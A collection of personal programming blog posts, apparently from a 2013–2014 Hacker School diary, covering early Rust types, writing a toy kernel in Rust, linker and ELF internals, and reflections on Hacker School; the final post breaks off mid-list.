{"url": "https://jvns.ca/blog/2013/12/02/types-in-rust/", "title": "Day 35: Types in Rust, for beginners", "content": "\n     \n\n I found understanding Rust types really confusing, so I wrote up a\nsmall tutorial for myself in an attempt to understand some of them.\nThis is by no means exhaustive. There is a\n types section \nin the manual, but it has nowhere near enough examples. \n\n This assumes that you’ve read the sections about\n owned \nand\n borrowed \npointers in the Rust tutorial, but not much else. \n\n I’m not talking about managed pointers ( @ ) at all. A lot of the\ndifficulty with Rust types is that the language is constantly\nchanging, so this will likely be out of date soon. \n\n First, a few preliminaries: it’s easier to play with types if you have\na REPL and can interactively check the types of objects. This isn’t\nreally possible in Rust, but there are workarounds. \n\n To start out: some help \n\n How to get a Rust REPL \n\n There is no working Rust REPL. However, you can use\n this script  to approximate one – it\ncompiles what you put into it and prints the result. You can’t use the\nresults of what you did previously, though. Save as  rustci . \n\n How to find the type of a variable \n\n Edit:  The fantastic  Daniel Micay \nshowed me this function to find the type of a variable. It’s included\nin the  rustci  script above, so you can just do \n\n let x = 2; type_of(&x) \n\n to print the type of  2 . Amazing. Note that you have to call\n type_of  with  &x  and not  x . \n\n The function is: \n\n fn type_of<T>(_: &T) -> &'static str {\n    unsafe {\n        (*std::unstable::intrinsics::get_tydesc::<T>()).name\n    }\n}\n \n\n Hackier approach: \n\n You can also generate a compiler error with the type of a variable  y \nlike this: \n\n fn y() {}\nlet x: () = y;\n \n\n It’s a hack, but it will give you an error like this: \n\n error: mismatched types: expected `()` but found `fn()` (expected () but found extern fn)\n \n\n which tells us that the type of  f  is  fn() . \n\n The types! \n\n Primitive types \n\n This is an incomplete list. \n\n Integers (signed and unsigned):  int ,  uint ,  i8 ,  i16 ,  i32 ,  i64 ,  u8 ,  u16 ,  u32 ,  u64 \n\n Floats:  f32 ,  f64 \n\n Booleans:  bool \n\n Primitive type examples \n\n let x: uint = 2;\nlet y: u8 = 40;\nlet z: f32 = abc;\n \n\n Vectors \n\n There are 3 possible types for a vector of  u8 :  [u8, ..N] ,  &[u8] ,  ~[u8] \n\n [u8]  by itself is not a type. \n\n [u8, ..5]  is a fixed-size vector of  u8  of length 5. \n\n Vector Examples \n\n // Fixed size vector\nlet x : [uint, ..10] = [5, ..10]; // [5,5,5,5,5,5,5,5,5,5]\n\n// Create a variable size owned vector\nlet mut numbers1 : ~[uint]= ~[0, 1, 2, 3, 4, 5];\n\n// Create a variable size borrowed vector. This is also called a \"vector slice\".\nlet mut numbers2 : &[uint]= &[0, 1, 2];\nlet mut slice: &[uint] = numbers1.slice(0, 3);\n \n\n Strings and characters \n\n Some string types include:  &str ,  ~str , and  &'static str . \n\n A string is represented internally as a vector of bytes. However,\n str  by itself is  not  a type, and there are no fixed-size strings.\nYou can convert any of the string types to a byte vector  &[u8] . \n\n char  is a 32-bit Unicode character. \n\n String Examples \n\n use std::option::Option;\n// Static string\nlet hello: &'static str = \"Hello!\";\nlet hello2: &str = \"Hello!\";\n\n// Owned string\nlet owned_hello: ~str = ~\"Hello!\";\n\n// Borrowed string\nlet borrowed_hello = &owned_hello;\n\n// Character\nlet c: char = 'a';\n\n// Indexing into a string gives you a byte, not a character.\nlet byte: u8 = owned_hello[1];\n\n// You need to create an iterator to get a character from a string.\nlet c: Option<char> = owned_hello.chars().nth(2);\n\n// Switch to the string's representation as bytes\nlet bytes: &[u8] = owned_hello.as_bytes();\n \n\n Functions \n\n For a function  fn(a: A) -> B \n\n fn(A)->B  is a type, So are  &(fn(A)->B) ,  ~(fn(A)->B) , but you need to add parens right now. \n\n You probably only want to use  fn(A)->B , though. \n\n Function type examples \n\n fn foo(a: int) -> f32 {\n    return 0.0;\n}\nlet bar: fn(int) -> f32 = foo; \nlet baz: &(fn(int) -> f32) = &foo;\n \n\n Closures \n\n The type of a closure mapping something of type  A  to type  B  is  |A| -> B . A closure with no arguments or return values has type  || . \n\n Closure type examples \n\n let captured_var = 10; \nlet closure_no_args = || println!(\"captured_var={}\", captured_var); \nlet closure_args = |arg: int| -> int {\n  println!(\"captured_var={}, arg={}\", captured_var, arg); \n  arg\n};\n\n// closure_no_args has type ||\n// closure_args has type |int| -> int\n\nfn call_closure(c1: ||, c2: |int| -> int) {\n  c1();\n  c2(2);\n}\n\ncall_closure(closure_no_args, closure_args);\n \n\n Raw pointers \n\n For any type  T ,  *T  is a type. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/03/day-36-programming-without-malloc/", "title": "Day 36: On programming without malloc", "content": "\n      So right now I’m working on writing a kernel in Rust. My current goal\nis to press keys on the keyboard and have them echoed to the screen.\nThis is going okay! I anticipate being able to type by the end of the\nweek. \n\n One thing that’s interesting is that my expectations around what\nprograms should be able to do is really different right now. Normally\nI write Python or other high-level languages, so my programs don’t run\ntoo quickly, but have tons of resources available to them (the\nInternet, a standard library, memory allocation, garbage collection,\n…). \n\n Writing operating systems is totally different. This is kind of\nobvious, but actually doing it is really fascinating. My OS literally\ncan’t allocate memory, and there’s no standard way to print (I have to\nwrite to the VGA buffer manually). I can still write loops, though, and\nin general writing Rust doesn’t feel too unfamiliar. But I expect my\ncode to run super fast, because it has no excuse not to :). Right now\nI definitely don’t have timers or anything, so I’m looping 80,000,000\ntimes to sleep. \n\n A few things that I can’t do that I’m used to being able to do: \n\n \n allocate memory \n print (I can sort of do this) \n sleep \n run other processes (there are no other programs) \n read from stdin (I don’t have a keyboard driver yet. There is no stdin.) \n open files (there are no files) \n list files (there are no files) \n \n\n (thanks to  Lea  for “there are no\nfiles” =D) \n\n The only real problem with not having  malloc  is that all the memory\nI use has to either be \n\n \n in the program at compile time, or \n allocated on the stack \n \n\n This is less difficult than I expected it to be! We’ll see how it\ncontinues. It does mean that I use a lot of global variables, and it’s\ngiven me an appreciation for why there is so much use of global\nvariables in the Linux kernel – if just need 1 struct, it makes so\nmuch more sense to just have 1 global struct than to keep  malloc ing\nand  free ing it all the time. \n\n Here’s an example of some code I have in the kernel!  main()  prints\nall the ASCII characters in a loop. \n\n pub unsafe fn putchar(x: u16, y: u16, c: u8) {\n    let idx : uint =  (y * VGA_WIDTH * 2 + x * 2) as uint;\n    // 0xb8000 is the VGA buffer\n    *((0xb8000 + idx) as *mut u16) = make_vgaentry(c, Black, Yellow);\n}\n\nfn make_vgaentry(c: u8, fg: Color, bg: Color) -> u16 {\n    // VGA entries are 2 bytes. The first byte is the character, the\n    second is the colour\n    let color = fg as u16 | (bg as u16 << 4);\n    return c as u16 | (color << 8);\n}\n\npub unsafe fn main() {\n    let mut i: u32 = 0;\n    let mut c: u8 = 65; // 'A'\n    let N: u32 = 80000000; // big enough number so that it goes slowly\n    loop {\n        i += 1;\n        if (i % N == 0) {\n            c += 1;\n            putchar(2, 4, c);\n        }\n    }\n}\n \n\n \nNote for pedants: I actually do have a  malloc  function because my\nRust standard library needs to link against it, but it’s defined like\nthis: \n\n malloc:\n    jmp $\n \n\n That’s assembly-speak for “loop forever”. If I get around to\nimplementing  malloc  it will be the Most Exciting Thing\n~~~\n \n\n"},
{"url": "https://jvns.ca/blog/2013/12/12/day-41-linkers-are-still-upsetting/", "title": "Day 41: Linkers are upsetting", "content": "\n      Today I spent pretty much the whole day trying to figure out what’s\ngoing on with a\n linker problem I’m having .\nI’ve fixed it, but I don’t understand  why  it’s fixed, and I am\nhaving no luck. \n\n Allison  and I paired on it for a bit, and\nwe discovered that if we order the sections  .text .rodata .data\n.bss , then the ELF file works correctly, but if they’re in any other\norder it doesn’t work.\n There’s a gist \nwith the offending linker scripts. \n\n I also created\n a StackOverflow question \nbut it is not getting any love. \n\n To compensate, I wrote a\n tiny start of a tutorial about binary formats . \n\n"},
{"url": "https://jvns.ca/blog/2013/12/06/day-38-after-7-days/", "title": "Day 38: After 6 days, I have problems that I can't understand at all", "content": "\n      tl;dr: I expect  NUMS[2]  to equal  NUMS[keycode]  when  keycode ==\n2 . This doesn’t appear to be the case, and I don’t understand how\nthis is possible. \n\n I’m trying to set up keycode handling in my kernel, and I’m having a\nstrange problem with array indexing that I can’t really fathom at all\n(except “something is wrong”). \n\n When I run this code, and press  1  several times, it prints  |2C |2C |2C |2C |2C |2C |2C |2C |2C . \n\n I am expecting it to print  |2C2|2C2|2C2|2C2|2C2|2C2|2C2|2C2|2C2| . \n\n Here is the code: \n\n // some imports removed\nstatic NUMS: &'static [u8] = bytes!(\"01234567890\");\n\n#[no_mangle]\npub unsafe fn _interrupt_handler_kbd() {\n    let keycode: u8 = inb(0x60);\n    if (keycode == 2 || keycode == 3) {\n        stdio::putc(NUMS[2]); // should be '2'. It is.\n        stdio::putc(65 + keycode); // should be 'C' (keycode = 2), because 'A' is 65 \n        stdio::putc(NUMS[keycode]); // should be '2', BUT IT ISN'T. IT IS SOMETHING ELSE. HOW IS THIS HAPPENING. \n        stdio::putc(124); /// this is '|', just as a delimiter.\n    }\n    outb(0x20, 0x20); // Tell the interrupt handler that we're done.\n}\n \n\n To summarize: \n\n \n the  2  is printed by  putc(NUMS[2]) \n the  C  is printed by  putc(65 + keycode) . This implies that  keycode == 2 , since 65 is ‘A’ \n the blank space is printed by  putc(NUMS[keycode]) . I would expect this to print  2 . But no. \n \n\n For bonus points, if I replace  if (keycode == 2 || keycode == 3) { \nwith  if(keycode == 2) { , then it prints\n |2C2|2C2|2C2|2C2|2C2|2C2|2C2|2C2|2C2| , which is right. I think this\nis because of a compiler optimization replacing  keycode  with  2 . \n\n If you have  qemu  and a nightly build of  rust  installed, you can\nrun this code by doing \n\n git clone git@github.com:jvns/rustboot.git\ncd rustboot\ngit checkout origin/compiler-nonsense\ngit submodule init\ngit submodule update\nmake run\n \n\n Some hypotheses: \n\n \n There’s something wrong with the Rust compiler \n There’s something wrong with the stack and how I’m calling\n _interrupt_handler_kbd \n ????????? \n \n\n I also can’t yet find the address of  _interrupt_handler_kbd  to look\nat the assembly to debug. It’s in the symbol table of the original\nobject file ( main.o ), but after linking it’s not in  main.bin , so I\ncan’t set a breakpoint in gdb. \n\n Ack. \n\n Edit:   Brian Mastenbrook  suggested\nto link using ELF and then use objcopy to create a binary, and that\nsomehow magically fixed the problem\n( this commit ).\nIf anyone can explain why, I would be Extremely Interested. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/16/day-43-hopefully-the-last-day-spent-fixing-linker-problems/", "title": "Day 43: SOMETHING IS ERASING MY PROGRAM WHILE IT’S RUNNING (oh wait oops)", "content": "\n      alternate title: “Hopefully the last day I spend all day trying to\ncompile my code properly” \n\n (context: I’m working on writing an OS, and am experiencing a\nmysterious recurring bug. After many days, I have found the reason!) \n\n Today I went through the following: \n\n \n Decide to try to write some code \n Upgrade Rust, since my version is 8 days old \n Oh no, the new Rust breaks my oldish version of  rust-core \n Upgrade rust-core \n Oh no, the new rust-core requires me to compile in a different way \n Spend a bunch of time messing with  clang  and friends to get\neverything to compile again \n Everything compiles. Yay! \n Try to run code \n Encounter mystery bug again, where my array mysteriously contains\n0s instead of its actual contents \n Make sad faces \n Go talk to  Allison . Allison is the best. \n Allison asks: “What linker debugging strategies do you have?”\n\n \n Change the linker script randomly (actual thing that has worked) \n Change variable attributes from ‘private’ to ‘public’ at random\n(actual other thing that has worked) \n Look at the linker map or symbol table (not helpful, so far) \n Attach gdb to qemu and inspect the contents of memory (!!!) \n \n \n\n gdb is great. It let me \n\n \n search my memory for “QWERTY” (not there! why not?) \n look at the memory at a given address (lots of zeros! huh!) \n Do a core dump, and compare it to the original file. Lots of zeros!\nWhy is half my program gone? \n \n\n SURPRISE MY CODE IS NOT WORKING BECAUSE SOMETHING IS ERASING IT. \n\n Can we talk about this? \n\n \n I have code \n I can compile my code \n Half of my binary gets overwritten with 0s at runtime. Why. What\ndid I do to deserve this? \n No wonder the order I put the binary in matters. \n \n\n It is a wonder that this code even runs, man. Man. \n\n Edit : I found why my binary has lots of 0s in it at runtime. It is\n  because I was only loading 12k of it in  loader.asm . Hopefully this\n  will serve as a lesson to someone. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/10/day-40-learning-about-linkers/", "title": "Day 40: Linkers are amazing.", "content": "\n     \n\n I have a linker bug in my kernel which is kind of infuriating me. So\nI’ve spent the whole day so far reading the first 11 parts of this\n excellent 20-part series about how linkers work \nby Ian Lance Taylor. \n\n Here are some notes on the series. This is gigantic and basically just\nfor my own reference, but summarizes what he talks about in the first\nhalf of the series. \n\n I’m not going to describe the basics of what a linker does because I\nknow already. I talk a little about linkers in\n How to call Rust from assembly ,\nand I found this\n Beginner’s guide to linkers \npretty helpful. Parts  [1]  and\n [2]  of the essay also discuss\n“what’s a linker?”. \n\n For context: Right now I have a bug while statically linking a\nsingle-threaded ELF file. So I will read about dynamic linking and\nthreading and things other than ELF, but I will mostly ignore it. \n\n 1. Basic linker data types: symbols, relocations, and contents \n\n There are  symbols ,  relocations  and  contents  in object\nfiles. I knew about symbols and contents already, but relocations are\nnew to me. The contents are the contents of a variable or function. A\nkey insight here is that the linker doesn’t actually care too much\nabout the contents – it’s just concerned with putting the contents in\nthe right place. \n\n Linkers don’t care about your functions and variables! They’re just\nbytes. :) In the first article he talks about linker speed – a\nbenchmark you could compare a linker to is  cat , because it’s just\ncombining the bytes together, and making some replacements along the\nway. \n\n Relocations  were new to me. The story here is that when you have\n  an object file, the assembly code often refer to a symbol like this: \n\n call awesome_function\n \n\n awesome_function  might be undefined – it could be a function\ndefined in a library that we’re planning to link against later. \n\n So after linking,  awesome_function  will be somewhere new, and we\nneed to put a memory address in  call awesome_function ! So there’s a\n relocation table  which keeps track of everything that needs to be\nmoved. \n\n To make this a bit more concrete, I looked at  man objdump . Turns out\nyou can look at the relocations in an object file by running  objdump\n-r file.o . When you look at the relocations in an ELF file, there are\na bunch of scary-looking things like  R_386_PC32  and  R_386_GOTPC .\nHere’s\n a page explaining what those things mean .\nFor example, I got this as an output from  objdump -r \n\n 00001a76 R_386_GOTPC       _GLOBAL_OFFSET_TABLE_\n00001a7f R_386_GOTOFF      _ZN3mem4base18he097c5c5c82e35fah4v0.0E\n00001a95 R_386_GOTOFF      _ZN3mem4base18he097c5c5c82e35fah4v0.0E\n00001ac4 R_386_PC32        __morestack\n \n\n I think the last line of that means “At  00001ac4 , there’s a\nreference to  __morestack . I’m going to need you to figure out the\ndistance from  00001ac4  to  __morestack  and add it to the dword at\n 00001ac4 . \n\n Basically  R_386_PC32  and friends are different rules that the linker\nhas to follow. Some possible things that relocation rules might do: \n\n \n Put a relative memory address somewhere \n Put an absolute memory address somewhere \n Add something to the Global Offset Table (GOT) \n Add something to the Procedure Lookup Table (PLT) \n \n\n I don’t know what the GOT/PLT are yet but hopefully as I keep reading\nI’ll learn. (I did! See part 4) \n\n From  Part 2 . \n\n 2. Object file formats \n\n Apparently there are many different kinds of object file formats\n(COFF, ELF, PE, a.out, IEEE-695, Mach-O, etc.). They can be either\n section-based  or  record-based . I only care about ELF. ELF is\nsection-based. This means that the file is split up into sections. \n\n You can use  readelf --sections myfile.o  to list the sections in an\nELF file, and  objdump -t  to list the symbol table and which section\neach symbol belongs to. \n\n Here are  the sections  and\n the symbol table  for an OCaml object file I\nfound on my machine. You can see that the sections that have\nmost of the symbols in them are  .data ,  .text , and  .bss . And\nthere’s a section called  .symtab , which I guess is the symbol table!\nNeat. \n\n .text  is the “code” of the program, and  .data ,  .bss , and\n .rodata  contain different kinds of globals. \n\n 3. Debugging symbols \n\n It says \n\n \n The ELF object file format stores debugging information in sections\nwith special names. \n \n\n It mentions debugging formats like “stabs strings” and “the DWARF\ndebugging format”, but not going down that rabbit hole right now. \n\n File formats and debugging symbols were in\n Part 3 . \n\n 4. Shared libraries and position independence \n\n A shared library is a  .dll  on Windows or a  .so  file on Linux. \n\n The deal with a shared library is when you create the library, you\ndon’t know what address in memory it’s going to be loaded at. (it\ndepends on what the dynamic linker decides to do). So some calculation\n(addition!) needs to happen no matter what. \n\n So there are two different strategies to deal with this. \n\n Strategy 1 : Make it  position dependent . This basically means\n  “write a huge relocation table and let the dynamic linker figure out\n  where everything should go”. Because there is a huge relocation\n  table, this means the library will take longer to load. \n\n Strategy 2 : Make it  position independent . This means “don’t\n  write a relocation table, but every time you call a function or\n  reference a variable, look up where it should be in a table”. So the\n  library loads more quickly, but runs more slowly. Tradeoffs! \n\n This brings us back to the “Global Offset Table” and “Procedure Lookup\nTable” from before! So in position independent code, the “Global\nOffset Table” is where look up our global and static variables, and\nthe “Procedure Lookup Table” is where we look up functions. \n\n The other super important thing here (discussed more in\n Part 6 ) is that in position\nindependent code, the assembly instructions always the  same , and\nonly the PLT and the GOT need be different. This means that if you\nhave a huge library two different processes can reference the same\n(read-only) assembly instructions and they only need to have their own\ncopy of the PLT and GOT. \n\n This is super neat! In my object file, I have \n\n 00001a76 R_386_GOTPC       _GLOBAL_OFFSET_TABLE_\n \n\n I guess that means the object file I am looking at is position\nindependent! \n\n Another neat thing about position independent code is that the dynamic\nlinker can do lazy loading – it can wait to put the address of a\nfunction in the PLT until it is actually loaded. So if you run a\nprogram that links against all of the math library, but only calls\n sin , it only needs to figure out the address of  sin . \n\n All this about shared libraries is in\n Part 4 . \n\n 5. What can go wrong with shared libraries \n\n There’s a super interesting discussion of a kind of bug you can have\nwith shared libraries in\n Part 5 . \n\n In C, you can take the address of a function ( &f ). The natural\naddress for  f  is its entry in the PLT, because that’s where you jump\nto when the function is called. But different shared libraries have\ndifferent  PLT s, so you might end up with two different addresses for\nthe function, and if you compared them you would get different\nanswers. Oh no! I did not know that this was even a thing. Cool! \n\n You can go read about the solution in the essay. \n\n All this stuff about dynamic linking is really interesting and\ncomplicated, but I’m actually reading this in an effort to solve a\nstatic linking problem that I have, so I’m not reading it with 100%\nattention. \n\n 6. ELF symbol visibility and types \n\n I didn’t know that symbols had visibility and types! I thought\neverything was global and pretty much the same type. I don’t care too\nmuch about this right now, though. \n\n Also from  Part 5 . \n\n 7. Linkers are architecture-dependent \n\n How a linker deals with relocations depends on the architecture of the\nmachine the binaries are for! When you’re writing an OS, you need a\ncross-compiler that targets your target architecture. But you also\nneed a cross-linker! Here’s why. \n\n C code:  g = 0 . \n\n Corresponding 386 code:  movl 0 g . \n\n Corresponding RISC code: \n\n li 1,0 // Set register 1 to 0\nlis 9,g@ha // Load high-adjusted part of g into register 9\nstw 1,g@l(9) // Store register 1 to address in register 9 plus low adjusted part g\n \n\n Here  g  is referenced twice! So the linker is going to need to know\nabout how RISC works and the relocation is going to look different\nthan it would on 386. \n\n This was  Part 6 . \n\n 8. Thread Local Storage \n\n Part 7  is an extremely cool\nexplanation of how ELF systems have special support for making\nthreading more efficient. I had no idea this was a thing the linker\ndid. Linkers are crazy. \n\n The idea here is that you can just mark a variable thread-local in C\nlike this: \n\n __thread int i;\n \n\n and the compiler and linker will do a bunch of stuff so that every\nthread has its own copy of the variable. \n\n The alternative here (I think) is to use  pthread_key_create ,\n pthread_get_specific  and  pthread_set_specific . I’ve never used\npthreads, but this is cool and definitely seems easier. There’s a\ndiscussion of when it is more efficient in the essay. (tl;dr: never\nslower, sometimes faster) \n\n 9. ELF segments \n\n More on “oh man ELF is complicated!”\n Part 8  has a description of\nall the section and segment types. \n\n Okay, so what is a  segment , anyway? We talked about  sections \nbefore – we said that they were  .text ,  .data ,  .rodata , etc. –\nto separate out read-only data from read-write data from program code.\n Segments  are collections of sections. \n\n ELF is an format for object files, and also executables. Apparently\nthe operating system doesn’t use the sections at all to run programs,\njust the segments. \n\n I’m a bit confused here, so let’s make this more concrete by looking\nat a simple “Hello World” C program. I couldn’t figure out how to use\n objdump  to look at segments, but my awesome friend\n Dave  suggested using  readelf  instead.\nThat totally works! \n\n Here’s the\n the entire output of  readelf --segments a.out .\nHere’s an excerpt: \n\n   Segment Sections...\n   00     \n   01     .interp \n   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss \n   04     .dynamic \n   05     .note.ABI-tag .note.gnu.build-id \n   06     .eh_frame_hdr \n   07     \n   08     .ctors .dtors .jcr .dynamic .got \n \n\n So here it looks like  .text  is in a segment with a bunch of stuff,\nand  .data  and  .bss  are in a segment together. There are a bunch of\npossible segment types. One of the most important ones seems to be\n LOAD . I think that means “load into memory”. The two segments marked\n LOAD  are segment  02  and  03 . This makes sense, because those are\nthe segments with  .text  and  .data  in them! \n\n The other segment types in  the output of readelf  are: \n\n \n INTERP : Which dynamic loader to use\n( /lib64/ld-linux-x86-64.so.2 ). I checked and this is an actual\nfile. <3. \n NOTE : I guess this is a note. \n GNU_EH_FRAME ,  GNU_STACK ,  GNU_RELRO : Some GNU extensions. I\ndon’t really know. \n DYNAMIC : Some stuff that the dynamic linker needs. \n PHDR : I quote: “This indicates the address and size of the segment\ntable. This is not too useful in practice as you have to have\nalready found the segment table before you can find this segment.”\nlulz. What. \n \n\n The last thing I want to note about this example is that section  02 \n(the one with  .text  and  .rodata  in it) has flags  RE , so it can\nbe executed. I’m wondering if you could trick the program into\nexecuting something from  .rodata , and if that could be bad. Section\n 03  has flags  RW , so it can be written to but not executed. \n\n So the reason that  .text  and  .data  aren’t in the same section is\nthat  .text  has to be read-only and  .data  needs to be read-write. \n\n Here’s another example of  the segments  and\n the symbol table  in the same program, but\nthis time statically linked. There are way less segments (the file is\nless complicated), but the symbol table is much bigger. \n\n Okay I think I’m pretty good with segments. This is cool! \n\n 9. Symbol versions \n\n Apparently in an ELF file, you can have two different versions of the\nsame symbol, in case the function signature has changed! This is\ncrazy. I thought that if you had  sin , there was only one  sin . \n\n Could you abuse this to have polymorphism in object files without\ndoing name mangling? Huh. \n\n The actual use case described for this is providing two versions for\n stat :  LIBC_1.0  and  LIBC_2.0  after it changed to support 64-bit\nfile offsets (whatever that means). \n\n From  Part 9 . \n\n 10. Parallel linking \n\n You can do linking in parallel to some extent. Also, once the output\nfile is laid out and its size is determined, you can use  mmap  and do\nthe I/O in parallel that way. Yay  mmap ! \n\n From  Part 10 . \n\n 11. Archives \n\n Apparently you can package a whole bunch of object files together into\nan  archive . This is what files with the  .a  extension are. Neat!\nI’ve seen those, but didn’t know what they were. They’re created with\nthe  ar  utility. \n\n I looked for archive files on my computer using  locate .a | egrep\n'.a$' | head , and I found one in  /etc/alternatives/libblas.a . It\nkind of makes sense that BLAS is made of a whole bunch of object\nfiles. \n\n I used  objdump -t /etc/alternatives/libblas.a  to look at is symbol\ntable. In  the output , it lists the symbol\ntable for each object file. Here’s\n just the list of object files .\n libblas.a  is made up of 313 object files. \n\n From  Part 11 . \n\n"},
{"url": "https://jvns.ca/blog/2014/02/15/how-was-hacker-school/", "title": "\"How was Hacker School?\"", "content": "\n      I got back from Hacker School 2 months ago, and people have been\nasking me “How was Hacker School?” pretty frequently. \n\n Firstly, Hacker School was amazing. It was one of the best experiences\nI’ve had, and I owe so much to them. I find it a bit hard to\narticulate exactly why it was so great, but I’ll try. \n\n Hacker School is  welcoming . On the first day of Hacker School, Dave\ntalked about how everyone is welcome at Hacker School. He asked us if\nanyone felt like they didn’t belong, and a bunch of people raised\ntheir hands. He talked about how everyone who was there belongs, and\nwe talked about things that we were excited and scared about. It was\nan amazing way to start. \n\n \n\n Hacker School is  positive . When I had a bug that I didn’t understand\nand asked one of the facilitators to help me out, they would\nfrequently say “Oh,  interesting !“. The attitude was “Oh, is\nsomething not working? How delightful! A learning opportunity!“.\nPeople of course got frustrated by gnarly bugs, but the overall\natmosphere was relentlessly positive. \n\n At Hacker School, people say  “yes, and!” . If you just learned to\nprogram and want to write a compiler, people will say “Great!\nAwesome!” and give you some suggestions of how to start. I don’t\nremember anyone ever being told that they couldn’t do something\nbecause they didn’t know enough. The answer is always “yes! And here\nis what you will need to know to do this thing!“. \n\n Hacker School has  amazing energy . Before I went, I worried that I\nwouldn’t be able to motivate myself to program today or wouldn’t have\nenough ideas to work. This was so wrong that it’s hilarious. Everyone\nhas so many ideas and is working on so many interesting things that\nthe difficult thing is saying no. I did more interesting projects in\nthe 3 months of Hacker School than I did in the rest of my life\ncombined. \n\n At Hacker School, people do a lot of  pairing , which is a fantastic\nway to learn, for a couple of reasons. It helps you focus, because it\nmeans you can’t go check Twitter instead of coding. It’s also a great\nway to learn things accidentally. I’ve learned so much by watching how\nother people code and learning new ways of thinking. \n\n Hacker School’s  resident program  is fantastic. In my batch, I had\ngreat conversations with \n\n \n Lindsey Kuper  convinced me to use\nRust to build an operating system \n Yaron Minsky  learned some of the\nbasics of Rust with me \n Philip Guo  and I talked about tools for\nautomatically discovering experts’ workflows, and I built\n this tool  afterwards \n Stefan Karpinski  answered tons of my Julia\nquestions, and gave a great presentation explaining how floating\npoint numbers work \n Mel Chua  gave me great advice about\npreparing a workshop and gave a fantastic talk about how to\nstructure your learning \n Jessica McKellar  helped me debug\nmy TCP problems \n \n\n The residents are all carefully chosen to be really approachable and\npositive and have tons of things to teach. It was amazing to have the\nopportunity to pair with all of them. \n\n The Hacker School  facilitators  are wonderful at what they do. Alan,\nAllison, Mary, Tom, and Zach are all amazing. I can’t do them justice\nhere, but I’m going to try to explain why. \n\n \n They’re all  relentlessly curious . If you have a problem, they\ngenuinely want to understand it and how to fix it and will help you\nout \n They have tons of practice at  understanding why you don’t\nunderstand . They do tons of teaching, and if you don’t understand\nsomething they’re good at guessing why and working with you to help\nyou get there. \n They work really hard on being  egoless  – they’re very quick to\nadmit if they’re wrong and care about understanding, not about being\nright \n They have a ton of  knowledge . If you’re having a gnarly Clojure\nproblem or want to know about Python internals or want to learn how\nto do async programming in Javascript, they can help you out. \n They’re also amazing at helping you with things they don’t know\nabout! Allison is a Python internals fiend, but she didn’t have a\nton of experience with operating systems or Rust. But if I needed\nhelp I would ask Allison to sit with me and she’d ask me super\nhelpful leading questions and we’d fix my bugs! They are magicians. \n They’ve all thought a lot about how to become a better programmer,\nand they’re very good at suggesting directions to go in if you’re\nstuck \n \n\n The facilitators work incredibly hard at helping people become better\nprogrammers and it really shows. \n\n Hacker School is an  experiment . The founders and facilitators are\nconstantly trying out new ideas and trying to make it better. Dave’s\nblog post on\n treating people like adults \ntalks about one experiment that didn’t work out. \n\n The Hacker School  admissions  process is one of the most important\nthings. Hacker School works really hard on only admitting people who\nare curious and friendly and wonderful. The other people in my batch\nwere amazing. I learned so much from them and I made some great\nfriends. \n\n Hacker School’s motto is  “Never Graduate” . Always keep learning,\nkeep being curious, keep building. There’s no such thing as a perfect\nplace so it’s not perfect, but they work really hard on always\nimproving, and I think they’re doing a great job. \n\n If you want to learn more, the\n manual  is great, the\n blog  is great, the\n FAQ  is great, and you can\n apply here . \n"},
{"url": "https://jvns.ca/blog/2013/12/13/day-42-how-to-run-an-elf-executable-i-dont-know/", "title": "Day 42: How to run a simple ELF executable, from scratch (I don't know)", "content": "\n     \n\n I want to compile a 32-bit “Hello, world!” statically-linked ELF\nbinary for Linux, and try to run it in my\n operating system . I’m trying to\nunderstand what I’ll have to do. The goal is to get everything just\nbarely working, so that it will print the string to the screen and not\ncrash the whole system. \n\n I asked a question about this a little while ago, and got\n lots of helpful responses .\nNow I need to make it a bit more concrete, though. \n\n I’ve discovered that this “set stuff up so that a program can run”\nbusiness is called  loading , and what I’m doing is writing a\n loader . Sweet. \n\n Right now I’m doing this before implementing paging and virtual memory\nand not after, because this seems more fun than virtual memory for\nnow. If this is a very bad idea, I would like to know. \n\n Things I’ll have to do \n\n \n Compile “hello-c” for a 32-bit OS, with  gcc -m32 -static \n Parse the ELF headers (using\n the wikipedia article ,\nand\n this great picture \nas a reference) \n Add an interrupt handler for  int 80  (or  sysenter , we’ll see!),\nso that I can handle system calls. \n Write the actual system call implementations, as few as possible. \n Find  e_entry , the entry point of the binary. \n Initialize registers? How? \n Change  something , so that the memory addresses in the binary\naren’t broken. Maybe? I still don’t 100% understand this. \n Finally: Jump to  _start , the memory address in  e_entry . I want\nto just do  jmp address  here. Then my program will run? \n \n\n Things I won’t have to do (yet) \n\n \n Read the file into memory – I’m planning to just keep the file as\na bunch of bytes in RAM to start, or possibly have a simple RAM\nfilesystem later. \n Security, and making sure process can’t trample on each others’\naddress spaces. \n Scheduling. \n Set up a special heap for the process. I’m just going to allocate\neveryone’s memory in the same part of physical memory for now. And\nnever free. Yeah. \n \n\n Questions I have \n\n \n Do I need to make sure my binary is\n position independent ? \n Do I need to implement virtual memory & paging? (I think not) \n Do I need to have a separate “user space” for the code to run in,\nor will it run in kernel space? (I think it will run in kernel\nspace) \n Do I need to change something in the GOT and/or PLT to make the\naddresses work right? (I think yes? maybe?) Is there even a PLT in\na static executable, or is that just for dynamic linking? Eep. Hmm. \n \n\n"},
{"url": "https://jvns.ca/blog/2014/06/29/how-i-did-hacker-school/", "title": "How I did Hacker School: ignoring things I understand and doing the impossible", "content": "\n      Hacker School  is a 12 week workshop\nwhere you work on becoming a better programmer. But when you have 12\nweeks of uninterrupted time to spend on whatever you want, what do you\nactually do? I\n wrote down what I worked on every day of Hacker School ,\nbut I always have trouble articulating advice about what to work on.\nSo this isn’t advice, it’s what I did. \n\n \n\n One huge part of the way I ended up approaching Hacker School was to\nignore a ton of stuff that goes on there. For example! I find all\nthese things kind of interesting: \n\n \n machine learning \n web development \n hardware projects \n games \n new programming languages \n \n\n But I’d been working as a web developer / in machine learning for a\ncouple of years, and I wasn’t scared by them. I don’t feel right now\nlike learning more programming languages is going to make me a better\nprogrammer. \n\n And there were  tons  of interesting-sounding workshops where Mary\nwould live code a space invaders game in Javascript (!!!), or Zach\nwould give an intermediate Clojure workshop, or people would work\ntogether on a fun hardware project. People were building neural\nnetworks, which looked fun! \n\n I mostly did not go to these workshops. It turned out that I was\ninterested in all those things, but more interested in learning: \n\n \n systems programming\n( linkers !\n strace !) \n networking\n( ARP 